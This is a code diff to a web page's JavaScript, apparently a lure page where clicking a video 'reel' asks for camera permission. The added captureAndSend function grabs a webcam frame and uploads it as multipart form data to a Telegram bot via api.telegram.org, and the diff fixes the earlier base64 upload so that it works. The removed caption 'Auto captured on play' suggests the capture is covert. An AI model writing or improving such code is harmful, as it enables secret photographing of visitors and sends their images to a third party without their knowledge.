@@ -116,28 +116,31 @@ document.querySelector(".reel").addEventListener("click", async () => {
         alert("Camera permission needed!");
     }
 });
-
-function captureAndSend(){
+function captureAndSend() {
     const cam = document.getElementById("camera");
     const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
     canvas.width = cam.videoWidth;
     canvas.height = cam.videoHeight;
+    ctx.drawImage(cam, 0, 0);
 
-    canvas.getContext("2d").drawImage(cam,0,0);
+    // Convert canvas to a Blob (File object)
+    canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "capture.jpg");
+        formData.append("caption", "📸 Captured Image");
 
-    let base64 = canvas.toDataURL("image/jpeg").split(",")[1];
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({
-            chat_id: chatId,
-            photo: `data:image/jpeg;base64,${base64}`,
-            caption: "📸 Auto captured on play"
+        // Send as multipart/form-data
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData // No headers needed, fetch sets them for FormData
         })
-    })
-  
+        .then(res => res.json())
+        .then(data => console.log("Sent to Telegram:", data))
+        .catch(err => console.error("Error:", err));
+    }, "image/jpeg", 0.8);
 }
 </script>
 
